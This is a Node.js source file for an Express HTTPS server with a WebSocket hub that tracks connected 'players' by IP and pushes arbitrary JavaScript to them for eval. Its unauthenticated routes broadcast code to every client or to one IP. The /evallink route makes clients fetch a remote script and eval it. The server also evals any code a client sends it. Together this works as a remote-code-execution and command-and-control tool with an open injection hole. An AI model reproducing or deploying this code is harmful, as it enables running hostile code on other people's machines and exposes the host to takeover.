const express = require('express');
const https = require('https');
const fs = require('fs');
const WebSocket = require('ws');

const privateKey = fs.readFileSync('private.key', 'utf8');
const certificate = fs.readFileSync('certificate.crt', 'utf8');
const caBundle = fs.readFileSync('ca_bundle.crt', 'utf8');


const app = express();
// Create a HTTPS server
const server = https.createServer({
    key: privateKey,
    cert: certificate,
    ca: caBundle
}, app);

const wss = new WebSocket.Server({ server });

let connectedClients = {};

// Function to send a message to a specific client
const sendMessage = (client, message) => {
    if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(message));
    }
}

// Command to handle ping
const pingCommand = (client) => {
    sendMessage(client, { type: "pong" });
};

// Command to handle eval
const evalCommand = (client, { code }) => {
    try {
        const returned = eval(code); // Execute the code sent from the server on the client's machine
        sendMessage(client, { type: "evaled", returned: `${returned}` });
    } catch (error) {
        sendMessage(client, { type: "error", message: error.message });
    }
};

const sendEvalToPlayers = (code, playerIP) => {
    for (const clientIP in connectedClients) {
        // console.log(`Checking client: ${clientIP}`);
        // console.log(`player: ${playerIP}`);
        const client = connectedClients[clientIP];
        // If the clientIP matches the playerIP, send the eval command
        if (clientIP === playerIP) {
            console.log(`matched`);
            console.log(`client: ${client}`);
            console.log(`code: ${code}`);
            sendMessage(client.ws, { type: "eval", code });
        }
    }
};


// Command dispatcher
const dispatchCommand = (client, { type, ...rest }) => {
    switch (type) {
        case 'eval':
            evalCommand(client, rest);
            break;
        case 'ping':
            pingCommand(client);
            break;
        default:
            break;
    }
};

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    const clientIP = req.socket.remoteAddress;
    connectedClients[clientIP] = { ws }; // Store WebSocket instance by client IP

    // Log new connection
    console.log(`New client connected - Client IP: ${clientIP}`);

    // Handle incoming messages from clients
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        dispatchCommand(ws, data);
    });

    // Handle client disconnection
    ws.on('close', () => {
        console.log(`Client disconnected - Client IP: ${clientIP}`);
        delete connectedClients[clientIP];
    });
});

// Express route to serve the web interface
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Express route to get the list of connected clients
app.get('/clients', (req, res) => {
    res.json(connectedClients);
});

// Express route to handle eval command
app.post('/eval', express.json(), (req, res) => {
    const code = req.body.code;
    for (const clientIP in connectedClients) {
        const client = connectedClients[clientIP].ws;
        sendMessage(client, { type: "eval", code });
    }
    res.sendStatus(200);
});

app.post('/evallink', express.json(), (req, res) => {
    const code = req.body.code;
    const fetchScript = `fetch(${code}).then(res => res.text().then(r => eval(r)));`;
    for (const clientIP in connectedClients) {
        const client = connectedClients[clientIP].ws;
        sendMessage(client, { type: "eval", code: fetchScript });
    }
    res.sendStatus(200);
});

// Route to send eval command to specific players
app.post('/eval/player', express.json(), (req, res) => {
    const { code, playerIP } = req.body;
    // if (!playerIPs || !Array.isArray(playerIPs) || playerIPs.length === 0) {
    //     res.status(400).send("No player IPs provided");
    //     return;
    // }

    sendEvalToPlayers(code, playerIP);
    res.sendStatus(200);
});

// Start the HTTPS server
server.listen(8080, () => {
    console.log('Server running on port 8080');
});